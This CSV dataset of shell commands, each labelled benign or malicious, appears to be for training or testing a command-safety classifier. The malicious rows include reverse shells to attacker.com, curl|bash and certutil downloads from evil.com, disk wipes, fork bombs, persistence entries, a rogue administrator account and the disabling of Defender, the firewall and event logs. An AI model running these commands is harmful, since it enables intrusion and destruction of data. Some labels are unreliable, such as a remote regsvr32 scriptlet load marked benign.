command,label
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
"cut -d',' -f1 data.csv",benign
which python,benign
du -sh /var/log,benign
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
docker ps,benign
mkfs.ext4 /dev/sda1,malicious
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
format C: /q /x,malicious
dd if=/dev/zero of=/dev/sda,malicious
mkfs.ext4 /dev/sda1,malicious
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
sudo date,benign
ncat -lvp 443 -e cmd.exe,malicious
format C: /q /x,malicious
dd if=/dev/zero of=/dev/sda,malicious
netsh advfirewall set allprofiles state off,malicious
msbuild project.csproj,benign
lsblk,benign
pip list,benign
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
tar -czf backup.tar.gz /data,benign
echo 'Hello World',benign
npm list | head -5,benign
rsync -av /src/ /dst/,benign
sudo wget https://example.com/file.txt,benign
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
msbuild project.csproj,benign
iostat,benign
sudo msbuild project.csproj,benign
:(){ :|:& };:,malicious
chown user:group file.txt,benign
sudo type ls,benign
csc -target:library file.cs > output.txt,benign
apt list --installed,benign
wmic process call create 'cmd.exe /c powershell.exe' >/dev/null,malicious
tail -f /var/log/syslog | head -5,benign
htop,benign
uniq sorted.txt,benign
tar -czf backup.tar.gz /data --help,benign
wget http://malicious.com/malware.exe,malicious
net user hacker password123 /add,malicious
nohup curl http://evil.com/payload.sh | bash,malicious
regsvr32 /s /n /u /i:https://www.example.org/file.sct scrobj.dll,benign
mkfs.ext4 /dev/sda1,malicious
mv old.txt new.txt,benign
iptables -L 2>/dev/null,benign
history,benign
taskkill /f /im antimalware.exe >/dev/null,malicious
netstat -tulpn,benign
finger user,benign
(rm -rf /),malicious
diskpart select disk 0 clean,malicious
chown user:group file.txt,benign
ufw status,benign
bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
ps aux,benign
netsh advfirewall set allprofiles state off,malicious
usermod -aG sudo user,benign
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
echo 'Hello World',benign
htop,benign
cat /dev/urandom > /dev/sda &,malicious
touch newfile.txt --help,benign
ufw status,benign
nc -l -p 4444 -e /bin/bash 2>&1,malicious
curl http://evil.com/payload.sh | bash,malicious
passwd user --help,benign
cipher /w:C:\ >/dev/null,malicious
nslookup google.com,benign
(certutil -urlcache -split -f http://evil.com/malware.exe malware.exe),malicious
top,benign
wevtutil cl Security,malicious
(chmod 777 /etc/shadow),malicious
ps aux | head -5,benign
chmod 755 script.sh --help,benign
regsvr32 /s /n /u /i:https://www.example.org/file.sct scrobj.dll,benign
(regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll),malicious
shutdown /r /f /t 0,malicious
sudo java -version,benign
nslookup google.com,benign
attrib +h +s malware.exe,malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
mount,benign
id user --help,benign
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS') &",malicious
docker ps,benign
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts &,malicious
msbuild project.csproj,benign
mkfs.ext4 /dev/sda1,malicious
echo 'virus' > /etc/passwd >/dev/null,malicious
mshta javascript:alert('code execution'),malicious
iptables -L,benign
awk '{print $1}' data.txt,benign
chmod 755 script.sh,benign
taskkill /f /im antimalware.exe,malicious
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon 2>&1,malicious
net user hacker password123 /add,malicious
finger user,benign
docker images,benign
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
head -10 logfile.txt,benign
docker ps,benign
wevtutil cl System,malicious
nohup :(){ :|:& };:,malicious
cmd /c del /q /s C:\*,malicious
sudo rsync -av /src/ /dst/,benign
chmod 777 /etc/shadow,malicious
"cut -d',' -f1 data.csv",benign
mkdir -p /tmp/test,benign
regsvr32 /s /n /u /i:https://www.example.org/file.sct scrobj.dll > output.txt,benign
uniq sorted.txt,benign
cat /etc/passwd,benign
pip list 2>/dev/null,benign
crontab -l,benign
ssh user@server.com,benign
ps aux,benign
dd if=/dev/zero of=/dev/sda,malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");' >/dev/null",malicious
dd if=/dev/zero of=/dev/sda,malicious
java -version -v,benign
"timeout 60 ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
wmic process call create 'cmd.exe /c powershell.exe',malicious
cp file1.txt file2.txt,benign
chmod 777 /etc/shadow,malicious
sed 's/old/new/g' file.txt,benign
systemctl reload nginx,benign
curl -I https://google.com,benign
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe >/dev/null,malicious
format C: /q /x,malicious
rm -rf /,malicious
sudo htop,benign
attrib +h +s malware.exe,malicious
sudo service apache2 status,benign
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
rm -rf / 2>&1,malicious
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
ps aux | head -5,benign
vssadmin delete shadows /all /quiet 2>&1,malicious
diskpart select disk 0 clean,malicious
powershell Get-Process | head -5,benign
mshta javascript:alert('code execution'),malicious
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
netstat -tulpn,benign
wevtutil cl Security,malicious
kubectl get pods,benign
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
net localgroup administrators hacker /add,malicious
userdel olduser,benign
curl http://evil.com/payload.sh | bash,malicious
curl -I https://google.com,benign
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
whoami > output.txt,benign
sudo finger user,benign
id user,benign
service apache2 status -v,benign
sc stop Windows Defender,malicious
groups user,benign
crontab -l,benign
"cut -d',' -f1 data.csv > output.txt",benign
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
rsync -av /src/ /dst/ -v,benign
find /home -name '*.txt',benign
wevtutil cl System,malicious
cat /etc/passwd,benign
regsvr32 /s /n /u /i:https://www.example.org/file.sct scrobj.dll | head -5,benign
timeout 60 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
vmstat,benign
df -h,benign
netsh advfirewall set allprofiles state off,malicious
"(python -c 'import os; os.system(""rm -rf /"")')",malicious
sort data.txt,benign
chown user:group file.txt,benign
whoami,benign
(wget http://malicious.com/malware.exe),malicious
netstat -tulpn,benign
free -m 2>/dev/null,benign
sudo mount,benign
mshta javascript:alert('code execution'),malicious
cat /dev/urandom > /dev/sda,malicious
lsblk 2>/dev/null,benign
systemctl reload nginx,benign
mkfs.ext4 /dev/sda1,malicious
whoami --help,benign
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
wevtutil cl Security,malicious
ncat -lvp 443 -e cmd.exe,malicious
netsh advfirewall set allprofiles state off >/dev/null,malicious
:(){ :|:& };:,malicious
nohup copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
htop,benign
ncat -lvp 443 -e cmd.exe,malicious
wget http://malicious.com/malware.exe,malicious
last,benign
iptables -L,benign
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
format C: /q /x,malicious
msbuild project.csproj,benign
attrib +h +s malware.exe,malicious
yum list installed,benign
attrib +h +s malware.exe,malicious
ss -tulpn,benign
netsh advfirewall set allprofiles state off,malicious
chmod 777 /etc/shadow,malicious
head -10 logfile.txt 2>/dev/null,benign
netsh advfirewall set allprofiles state off,malicious
nohup sc stop Windows Defender,malicious
sudo man ls,benign
ping -c 4 google.com 2>/dev/null,benign
dd if=/dev/zero of=/dev/sda,malicious
nc -l -p 4444 -e /bin/bash,malicious
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
tar -czf backup.tar.gz /data,benign
cipher /w:C:\,malicious
yum list installed,benign
nc -l -p 4444 -e /bin/bash,malicious
free -m 2>/dev/null,benign
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
ss -tulpn | head -5,benign
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
chmod 777 /etc/shadow,malicious
sudo history,benign
nslookup google.com,benign
curl http://evil.com/payload.sh | bash >/dev/null,malicious
format C: /q /x,malicious
nslookup google.com 2>/dev/null,benign
echo 'virus' > /etc/passwd,malicious
bcdedit /set {default} bootstatuspolicy ignoreallfailures 2>&1,malicious
csc -target:library file.cs,benign
mshta javascript:alert('code execution'),malicious
cat /dev/urandom > /dev/sda,malicious
sc stop Windows Defender,malicious
dd if=/dev/zero of=/dev/sda,malicious
docker ps -v,benign
cat /dev/urandom > /dev/sda,malicious
echo 'virus' > /etc/passwd,malicious
cat /dev/urandom > /dev/sda,malicious
nohup bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
curl -I https://google.com 2>/dev/null,benign
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
sc stop Windows Defender,malicious
docker images > output.txt,benign
useradd newuser,benign
man ls,benign
rsync -av /src/ /dst/,benign
net localgroup administrators hacker /add,malicious
chmod 777 /etc/shadow,malicious
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
iostat,benign
nohup netsh advfirewall set allprofiles state off,malicious
netsh advfirewall set allprofiles state off,malicious
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
cat /etc/passwd,benign
usermod -aG sudo user,benign
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
cmd /c del /q /s C:\* &,malicious
pwd,benign
net localgroup administrators hacker /add >/dev/null,malicious
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
certutil -hashfile file.txt SHA256 -v,benign
htop 2>/dev/null,benign
df -h,benign
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
htop,benign
npm list,benign
usermod -aG sudo user | head -5,benign
vssadmin delete shadows /all /quiet,malicious
"cut -d',' -f1 data.csv",benign
wget http://malicious.com/malware.exe,malicious
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
netsh advfirewall set allprofiles state off,malicious
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe >/dev/null,malicious
wmic process call create 'cmd.exe /c powershell.exe',malicious
cmd /c del /q /s C:\*,malicious
date > output.txt,benign
mount,benign
powershell Get-Process -v,benign
bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
nc -l -p 4444 -e /bin/bash 2>&1,malicious
traceroute google.com,benign
ping -c 4 google.com,benign
tar -czf backup.tar.gz /data | head -5,benign
rsync -av /src/ /dst/,benign
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")' 2>&1",malicious
sudo mount,benign
nohup powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
:(){ :|:& };: &,malicious
nohup dd if=/dev/zero of=/dev/sda,malicious
whoami,benign
sc stop Windows Defender 2>&1,malicious
awk '{print $1}' data.txt,benign
node --version,benign
curl http://evil.com/payload.sh | bash,malicious
"python -c 'import os; os.system(""rm -rf /"")'",malicious
wevtutil cl Security,malicious
traceroute google.com -v,benign
traceroute google.com,benign
useradd newuser,benign
taskkill /f /im antimalware.exe,malicious
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
sudo sort data.txt,benign
scp file.txt user@server:/path/ 2>/dev/null,benign
regsvr32 /s /n /u /i:https://www.example.org/file.sct scrobj.dll,benign
(rm -rf /),malicious
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
"cut -d',' -f1 data.csv",benign
ping -c 4 google.com,benign
nohup echo 'virus' > /etc/passwd,malicious
diskpart select disk 0 clean >/dev/null,malicious
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
which python,benign
npm list > output.txt,benign
rsync -av /src/ /dst/ --help,benign
wevtutil cl Security,malicious
cipher /w:C:\,malicious
msbuild project.csproj,benign
rm -rf /,malicious
rm -rf /,malicious
diskpart select disk 0 clean,malicious
sudo crontab -l,benign
attrib +h +s malware.exe,malicious
ping -c 4 google.com,benign
traceroute google.com,benign
taskkill /f /im antimalware.exe >/dev/null,malicious
sdelete -p 10 -s -z C:\ &,malicious
date,benign
net user hacker password123 /add,malicious
timeout 60 schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
"python -c 'import os; os.system(""rm -rf /"")' &",malicious
net localgroup administrators hacker /add,malicious
head -10 logfile.txt --help,benign
find /home -name '*.txt' | head -5,benign
chown user:group file.txt,benign
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
sort data.txt | head -5,benign
systemctl reload nginx > output.txt,benign
echo 'virus' > /etc/passwd 2>&1,malicious
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
cat /dev/urandom > /dev/sda >/dev/null,malicious
history,benign
ss -tulpn,benign
nohup taskkill /f /im antimalware.exe,malicious
ssh user@server.com | head -5,benign
wevtutil cl System,malicious
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
diskpart select disk 0 clean,malicious
cipher /w:C:\,malicious
"(rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS'))",malicious
timeout 60 powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
shutdown /r /f /t 0,malicious
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
id user,benign
nohup bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
uniq sorted.txt 2>/dev/null,benign
cmd /c del /q /s C:\*,malicious
timeout 60 curl http://evil.com/payload.sh | bash,malicious
wmic process call create 'cmd.exe /c powershell.exe' &,malicious
tail -f /var/log/syslog,benign
userdel olduser,benign
head -10 logfile.txt,benign
bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
type ls,benign
curl http://evil.com/payload.sh | bash,malicious
msbuild project.csproj,benign
dd if=/dev/zero of=/dev/sda,malicious
net user hacker password123 /add 2>&1,malicious
net localgroup administrators hacker /add,malicious
history,benign
sudo whoami,benign
net user hacker password123 /add,malicious
timeout 60 :(){ :|:& };:,malicious
:(){ :|:& };:,malicious
(curl http://evil.com/payload.sh | bash),malicious
shutdown /r /f /t 0,malicious
uniq sorted.txt,benign
userdel olduser,benign
"timeout 60 socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
ping -c 4 google.com,benign
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
attrib +h +s malware.exe,malicious
curl http://evil.com/payload.sh | bash >/dev/null,malicious
ss -tulpn 2>/dev/null,benign
touch newfile.txt > output.txt,benign
timeout 60 certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
ncat -lvp 443 -e cmd.exe 2>&1,malicious
wevtutil cl System 2>&1,malicious
bash -i >& /dev/tcp/attacker.com/443 0>&1 >/dev/null,malicious
iptables -L,benign
timeout 60 netsh advfirewall set allprofiles state off,malicious
crontab -l,benign
who,benign
node --version,benign
net localgroup administrators hacker /add,malicious
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
ufw status,benign
wget http://malicious.com/malware.exe,malicious
taskkill /f /im antimalware.exe &,malicious
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
mshta javascript:alert('code execution'),malicious
kubectl get pods,benign
timeout 60 cipher /w:C:\,malicious
chmod 777 /etc/shadow,malicious
ss -tulpn,benign
powershell Get-Process -v,benign
(taskkill /f /im antimalware.exe),malicious
apt list --installed,benign
date,benign
mshta javascript:alert('code execution'),malicious
net user hacker password123 /add,malicious
taskkill /f /im antimalware.exe,malicious
docker ps > output.txt,benign
msbuild project.csproj,benign
regsvr32 /s /n /u /i:https://www.example.org/file.sct scrobj.dll,benign
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");' >/dev/null",malicious
mv old.txt new.txt,benign
history,benign
kubectl get pods,benign
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
tar -czf backup.tar.gz /data,benign
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
cat /etc/passwd,benign
du -sh /var/log,benign
umount /dev/sdb1,benign
echo 'Hello World' | head -5,benign
curl -I https://google.com,benign
csc -target:library file.cs | head -5,benign
net user hacker password123 /add,malicious
"(python -c 'import os; os.system(""rm -rf /"")')",malicious
regsvr32 /s /n /u /i:https://www.example.org/file.sct scrobj.dll,benign
curl http://evil.com/payload.sh | bash,malicious
docker ps --help,benign
sort data.txt,benign
cat /dev/urandom > /dev/sda,malicious
wmic process call create 'cmd.exe /c powershell.exe',malicious
rm -rf /,malicious
ss -tulpn,benign
diskpart select disk 0 clean,malicious
nohup taskkill /f /im antimalware.exe,malicious
sdelete -p 10 -s -z C:\,malicious
date --help,benign
msbuild project.csproj,benign
curl -I https://google.com,benign
systemctl reload nginx,benign
cat /dev/urandom > /dev/sda,malicious
"python -c 'import os; os.system(""rm -rf /"")'",malicious
net localgroup administrators hacker /add 2>&1,malicious
(taskkill /f /im antimalware.exe),malicious
pwd > output.txt,benign
format C: /q /x,malicious
cipher /w:C:\,malicious
finger user,benign
sudo mount,benign
bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
python --version,benign
sed 's/old/new/g' file.txt,benign
umount /dev/sdb1,benign
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
cp file1.txt file2.txt -v,benign
(:(){ :|:& };:),malicious
tar -czf backup.tar.gz /data,benign
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
cipher /w:C:\ 2>&1,malicious
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
rm -rf /,malicious
sudo systemctl reload nginx,benign
docker ps,benign
umount /dev/sdb1,benign
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS') >/dev/null",malicious
echo 'Hello World',benign
nohup mkfs.ext4 /dev/sda1,malicious
chmod 777 /etc/shadow,malicious
wget http://malicious.com/malware.exe,malicious
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
cp file1.txt file2.txt,benign
head -10 logfile.txt,benign
pwd > output.txt,benign
sed 's/old/new/g' file.txt -v,benign
wmic process call create 'cmd.exe /c powershell.exe',malicious
passwd user,benign
crontab -l,benign
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
sc stop Windows Defender,malicious
npm list,benign
wget http://malicious.com/malware.exe,malicious
id user 2>/dev/null,benign
regsvr32 /s /n /u /i:https://www.example.org/file.sct scrobj.dll,benign
history,benign
usermod -aG sudo user,benign
mkfs.ext4 /dev/sda1,malicious
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
git pull origin main | head -5,benign
passwd user,benign
ls -la,benign
systemctl status nginx 2>/dev/null,benign
ping -c 4 google.com,benign
curl -I https://google.com,benign
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS') 2>&1",malicious
scp file.txt user@server:/path/ | head -5,benign
vssadmin delete shadows /all /quiet,malicious
"nohup ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
"cut -d',' -f1 data.csv -v",benign
npm list,benign
sudo ping -c 4 google.com,benign
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe &,malicious
yum list installed,benign
netsh advfirewall set allprofiles state off,malicious
systemctl reload nginx 2>/dev/null,benign
vmstat --help,benign
wmic process call create 'cmd.exe /c powershell.exe' >/dev/null,malicious
format C: /q /x,malicious
nslookup google.com --help,benign
iptables -L,benign
(dd if=/dev/zero of=/dev/sda),malicious
wget https://example.com/file.txt,benign
timeout 60 vssadmin delete shadows /all /quiet,malicious
ls -la,benign
nc -l -p 4444 -e /bin/bash 2>&1,malicious
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
crontab -l,benign
git pull origin main 2>/dev/null,benign
id user,benign
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
chmod 777 /etc/shadow,malicious
nohup rm -rf /,malicious
wevtutil cl Security,malicious
whoami,benign
dd if=/dev/zero of=/dev/sda,malicious
netstat -tulpn | head -5,benign
usermod -aG sudo user | head -5,benign
fdisk -l 2>/dev/null,benign
curl -I https://google.com -v,benign
shutdown /r /f /t 0,malicious
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
bash -i >& /dev/tcp/attacker.com/443 0>&1 2>&1,malicious
ss -tulpn,benign
netsh advfirewall set allprofiles state off,malicious
curl -I https://google.com,benign
cp file1.txt file2.txt,benign
curl http://evil.com/payload.sh | bash,malicious
man ls,benign
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
taskkill /f /im antimalware.exe,malicious
taskkill /f /im antimalware.exe,malicious
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
sudo cat /etc/passwd,benign
sc stop Windows Defender &,malicious
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
ufw status -v,benign
node --version,benign
timeout 60 netsh advfirewall set allprofiles state off,malicious
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
history > output.txt,benign
touch newfile.txt,benign
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
vmstat,benign
iptables -L,benign
cmd /c del /q /s C:\*,malicious
git clone https://github.com/user/repo.git,benign
wget http://malicious.com/malware.exe,malicious
curl http://evil.com/payload.sh | bash,malicious
id user,benign
finger user,benign
nc -l -p 4444 -e /bin/bash,malicious
shutdown /r /f /t 0,malicious
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
net user hacker password123 /add,malicious
python --version 2>/dev/null,benign
(rm -rf /),malicious
vmstat,benign
curl http://evil.com/payload.sh | bash,malicious
mkdir -p /tmp/test,benign
usermod -aG sudo user,benign
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
tail -f /var/log/syslog --help,benign
regsvr32 /s /n /u /i:https://www.example.org/file.sct scrobj.dll,benign
service apache2 status,benign
format C: /q /x,malicious
wc -l document.txt,benign
regsvr32 /s /n /u /i:https://www.example.org/file.sct scrobj.dll > output.txt,benign
finger user,benign
curl http://evil.com/payload.sh | bash,malicious
curl http://evil.com/payload.sh | bash,malicious
umount /dev/sdb1,benign
htop > output.txt,benign
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
mkfs.ext4 /dev/sda1,malicious
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
net localgroup administrators hacker /add,malicious
netstat -tulpn -v,benign
java -version,benign
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
mkfs.ext4 /dev/sda1,malicious
git clone https://github.com/user/repo.git -v,benign
cipher /w:C:\ >/dev/null,malicious
net localgroup administrators hacker /add,malicious
curl http://evil.com/payload.sh | bash,malicious
mshta javascript:alert('code execution') >/dev/null,malicious
who,benign
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
nslookup google.com > output.txt,benign
bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
sudo df -h,benign
scp file.txt user@server:/path/,benign
whoami,benign
w | head -5,benign
whoami,benign
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
format C: /q /x,malicious
dd if=/dev/zero of=/dev/sda,malicious
iostat,benign
nohup rm -rf /,malicious
diskpart select disk 0 clean,malicious
format C: /q /x,malicious
regsvr32 /s /n /u /i:https://www.example.org/file.sct scrobj.dll,benign
grep pattern file.txt,benign
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
mkdir -p /tmp/test 2>/dev/null,benign
sudo mv old.txt new.txt,benign
cp file1.txt file2.txt,benign
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
nohup mkfs.ext4 /dev/sda1,malicious
cat /dev/urandom > /dev/sda,malicious
chown user:group file.txt,benign
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
sdelete -p 10 -s -z C:\ 2>&1,malicious
cmd /c del /q /s C:\*,malicious
nohup mkfs.ext4 /dev/sda1,malicious
mkdir -p /tmp/test > output.txt,benign
sudo crontab -l,benign
rm -rf /,malicious
nohup bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
shutdown /r /f /t 0,malicious
cp file1.txt file2.txt -v,benign
ssh user@server.com,benign
shutdown /r /f /t 0,malicious
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
dd if=/dev/zero of=/dev/sda &,malicious
free -m,benign
certutil -hashfile file.txt SHA256,benign
passwd user,benign
:(){ :|:& };:,malicious
cmd /c del /q /s C:\* 2>&1,malicious
service apache2 status | head -5,benign
curl http://evil.com/payload.sh | bash,malicious
wc -l document.txt,benign
rm -rf / &,malicious
taskkill /f /im antimalware.exe,malicious
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
:(){ :|:& };:,malicious
umount /dev/sdb1 2>/dev/null,benign
cat /etc/passwd,benign
sc stop Windows Defender,malicious
fdisk -l,benign
